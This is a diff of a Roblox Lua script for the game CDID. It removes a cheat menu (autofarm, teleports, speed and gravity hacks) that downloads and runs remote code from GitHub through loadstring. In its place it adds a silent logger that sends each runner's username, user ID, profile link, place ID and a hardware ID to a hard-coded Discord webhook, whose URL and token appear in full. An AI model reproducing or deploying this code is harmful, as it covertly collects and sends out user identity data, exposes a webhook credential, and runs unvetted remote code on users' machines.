@@ -1,366 +1,71 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Player = game.Players.LocalPlayer
-local Window = OrionLib:MakeWindow({Name = "creamy script | CDID", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-
-OrionLib:MakeNotification({
-	Name = "Logged in",
-	Content = "You are logged in as "..Player.Name..".",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
-
--- MAIN
-
-local Tab = Window:MakeTab({
-	Name = "Main",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
-local Section = Tab:AddSection({
-	Name = "AutoFarm"
-})
-
-Tab:AddButton({
-	Name = "Cafe Autofarm fast",
-	Callback = function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/azzlk/test/main/test",true))();
-	end    
-})
-
-Tab:AddLabel("Truck farm is currently bugged! please use it manually.")
-
-Tab:AddButton({
-	Name = "Truck Farm",
-	Callback = function()
-		workspace.Gravity = 19
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-21786.4941, 1042.03015, -26786.1133, 0.173290819, 2.08386037e-08, 0.984870672, 1.86746458e-08, 1, -2.44445779e-08, -0.984870672, 2.26281323e-08, 0.173290819)
-OrionLib:MakeNotification({
-	Name = "Phase 1",
-	Content = "Please get into a truck"..Player.Name.."!",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-	
-})
-wait(5)
-
-OrionLib:MakeNotification({
-	Name = "Wait!",
-	Content = "Please wait 100 seconds to let the truck tp!"..Player.Name.."!",
-	Image = "rbxassetid://4483345998",
-	Time = 5
-})
-		local args = {
-			[1] = "Truck"
-		}
-		game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-wait(15)
-local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-21803.887, 1046.989, -27817.059))                       --Cirebon
-wait(100)
-local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-38720.934, 1018.218, -62491.059))                          -- Pekalongan
-wait(100)
-local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-13001.578, 1058.455, -16360.201))                           -- PT Shad Cirebon
-wait(100)
-local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-50889.66, 1017.867, -86514.797))                           -- Semarang
-local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-25910.939, 1059.604, -43896.273))                           -- KM 279
-	end    
-})
-
--- Manual
-Tab:AddLabel("Destination Teleporter")
-Tab:AddLabel("Please wait 90 seconds every tp!")
-Tab:AddButton({
-	Name = "Silambat Palimanan",
-	Callback = function()
-		local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-		function teleportcar(cframe)
-			playerCar:SetPrimaryPartCFrame(cframe)
-		end
-		teleportcar(CFrame.new(-13001.578, 1058.455, -16360.201))
-  	end    
-})
-
-Tab:AddButton({
-	Name = "Rest Area Km 279",
-	Callback = function()
-		local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-		function teleportcar(cframe)
-			playerCar:SetPrimaryPartCFrame(cframe)
-		end
-		teleportcar(CFrame.new(-25910.939, 1059.604, -43896.273))                           -- KM 279
-  	end    
-})
-Tab:AddButton({
-	Name = "SuperMart Pekalongan",
-	Callback = function()
-		local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-38720.934, 1018.218, -62491.059))
-  	end    
-})
-Tab:AddButton({
-	Name = "PT.CDID Cargo Cirebon",
-	Callback = function()
-		local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-21803.887, 1046.989, -27817.059))
-  	end    
-})
-Tab:AddButton({
-	Name = "Rojod Semarang",
-	Callback = function()
-		local playerCar = game.workspace.Vehicles[game.Players.LocalPlayer.Name .."sCar"]
-function teleportcar(cframe)
-    playerCar:SetPrimaryPartCFrame(cframe)
-end
-teleportcar(CFrame.new(-50889.66, 1017.867, -86514.797))
-  	end    
-})
-
--- Miscellanous
-getgenv().TPPlace = "string"
-getgenv().JobChange = "string"
-getgenv().JobTP = "string"
-
-function Teleport(TeleportPlace)
-	local player = game.Players.LocalPlayer
-	player.Character.HumanoidRootPart.CFrame = TeleportPlace
+local http_request = request or http_request or (http and http.request) or syn and syn.request;
+if not http_request then
+    print('executor not supported')
+    return; -- // break out of script
 end
 
-local Tab = Window:MakeTab({
-	Name = "Misc",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
+local webhookURL = "https://discord.com/api/webhooks/1139185688760295516/I11GjGxxRWSURZMAUhzCb1-Qx_5TVJoD-R65mKigezsQHcAe-UMNyFa8fRA-2z8CEwFk"  -- Replace with your actual webhook URL
+
+local hwidResponse = http_request({
+    Url = "https://luaguard.rocks/Roblox/hwid.php",
+    Method = 'GET'
+}).Body;
+
+local player = game.Players.LocalPlayer
+local username = player.Name
+local id = player.UserId
+local place_id = game.PlaceId
+local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name
+ 
+local PlayerData =
+{
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "Script Execution Report",
+            ["description"] = "Script executed by: **" .. username .. "**",
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name,
+            },
+            ["color"] = tonumber(0x2B6BE4),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = player.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "UserID:",
+                    ["value"] = id,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Client HWID:",
+                    ["value"] = "||" .. hwidResponse .. "||",  -- HWID with || added
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Client Profile:",
+                    ["value"] = "https://www.roblox.com/users/" .. id,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Place ID:",
+                    ["value"] = "https://www.roblox.com/games/" .. place_id,
+                    ["inline"] = false
+                }
+            }
+        }
+    }
+}
+
+local PlayerDataJSON = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+local Headers = {["content-type"] = "application/json"}
+
+http_request({
+    Url = webhookURL,
+    Method = 'POST',
+    Headers = Headers,
+    Body = PlayerDataJSON
 })
-
-Tab:AddLabel("Only works in Central Java!")
-
-local Section = Tab:AddSection({
-	Name = "Teleports"
-})
-
-Tab:AddDropdown({
-	Name = "Trans CDID",
-	Default = "Cirebon",
-	Options = {"Cirebon", "Palimanan", "Pekalongan", "Rest Area KM 166", "Rest Area KM 57", "Semarang", "Tegal"},
-	Callback = function(Value)
-		getgenv().TPPlace = Value
-	end    
-})
-	Tab:AddButton({
-		Name = "Teleport!",
-		Callback = function()
-			if getgenv().TPPlace == "Cirebon" then
-local args = {
-    [1] = "Cirebon"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-				elseif getgenv().TPPlace == "Palimanan" then 
-local args = {
-    [1] = "Palimanan"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-elseif getgenv().TPPlace == "Pekalongan" then 
-local args = {
-    [1] = "Pekalongan"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-elseif getgenv().TPPlace == "Rest Area KM 166" then
-local args = {
-    [1] = "Rest Area KM 166"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-elseif getgenv().TPPlace == "Rest Area KM 57" then
-local args = {
-    [1] = "Rest Area KM 57"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-elseif getgenv().TPPlace == "Semarang" then
-	local args = {
-		[1] = "Semarang"
-	}
-	game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-elseif getgenv().TPPlace == "Tegal" then
-	local args = {
-		[1] = "Tegal"
-	}
-	game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.TransEvent:FireServer(unpack(args))
-			end
-		  end    
-	})
-
-	local Section = Tab:AddSection({
-		Name = "Job Changer"
-	})
-	Tab:AddDropdown({
-		Name = "Jobs",
-		Default = "Taxi",
-		Options = {"Taxi", "Emergency", "Gowes", "Janji Jiwa", "Unemployed", "Office Worker", "SiLambat Courier", "Truck Driver", "Travel Driver"},
-		Callback = function(Value)
-			getgenv().JobChange = Value
-		end    
-	})
-
-	Tab:AddButton({
-		Name = "Change Job",
-		Callback = function()
-			if getgenv().JobChange == "Taxi" then
-local args = {
-    [1] = "Taxi"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Emergency" then
-local args = {
-    [1] = "Emergency"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Gowes" then
-local args = {
-    [1] = "Gowes"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Janji Jiwa" then
-local args = {
-    [1] = "JanjiJiwa"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Unemployed" then 
-local args = {
-    [1] = "Unemployed"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Office Worker" then 
-local args = {
-    [1] = "Office"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "SiLambat Courier"then 
-local args = {
-    [1] = "SiLambat"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Truck Driver" then 
-local args = {
-    [1] = "Truck"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-elseif getgenv().JobChange == "Travel Driver" then 
-local args = {
-    [1] = "Travel"
-}
-game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Job:FireServer(unpack(args))
-end
-end
-})
-	local Section = Tab:AddSection({
-		Name = "Job Teleporter"
-	})
-	Tab:AddDropdown({
-		Name = "Job TP",
-		Default = "Taxi",
-		Options = {"Taxi", "Emergency", "Gowes", "Janji Jiwa", "Unemployed", "Office Worker", "SiLambat Courier", "Truck Driver", "Travel Driver"},
-		Callback = function(Value)
-			getgenv().JobTP = Value
-		end    
-	})
-	Tab:AddButton({
-		Name = "Teleport!",
-		Callback = function()
-			if getgenv().JobTP == "Taxi" then
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(18011.764, -15.34, 18275.434)
-			elseif getgenv().JobTP == "Emergency" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31466.365, 1049.048, -46568.891)
-			elseif getgenv().JobTP == "Gowes" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-21769.4043, 1044.51257, -23655.2637, 0.413411528, -3.70395767e-08, 0.910544276, -4.21759054e-08, 1, 5.98274923e-08, -0.910544276, -6.31364045e-08, 0.413411528)
-			elseif getgenv().JobTP == "Janji Jiwa" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13719.616, 1053.167, -17999.459)
-			elseif getgenv().JobTP == "Unemployed" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(56.699, 938.324, 61693.672)
-			elseif getgenv().JobTP == "Office Worker" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-38581.773, 1036.849, -62765.898)
-			elseif getgenv().JobTP == "SiLambat Courier" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13042.404, 1057.504, -16307.932)
-			elseif getgenv().JobTP == "Truck Driver" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-21799.832, 1042.652, -26797.654)
-			elseif getgenv().JobTP == "Travel Driver" then
-				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-306.885, 938.462, 61432.563)
-			end
-		  end    
-	})
-	
-
-local Section = Tab:AddSection({
-	Name = "Box Sniper"
-})
-Tab:AddButton({
-	Name = "Box Sniper",
-	Callback = function()
-		local args = {
-			[1] = "Buy",
-			[2] = "Limited Box"
-		}
-		game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.Box:FireServer(unpack(args))
-	end    
-})
--- FUN STUF
-
-local Tab = Window:MakeTab({
-	Name = "Player",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-   })
-   
-   local Section = Tab:AddSection({
-	Name = "Movement"
-   })
-
-Tab:AddSlider({
-	Name = "Walkspeed",
-	Min = 16,
-	Max = 500,
-	Default = 16,
-	Color = Color3.fromRGB(255,255,255),
-	Increment = 1,
-	ValueName = "WS",
-	Callback = function(Value)
-	 game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
-	end    
-   })
-   
- Tab:AddSlider({
-    Name = "Gravity",
-    Min = 0,
-    Max = 500,
-    Default = 196.2, 
-    Color = Color3.fromRGB(255, 255, 255),
-    Increment = 1,
-    ValueName = "m/s^2", 
-    Callback = function(Value)
-        workspace.Gravity = Value
-    end
-})
-OrionLib:Init()
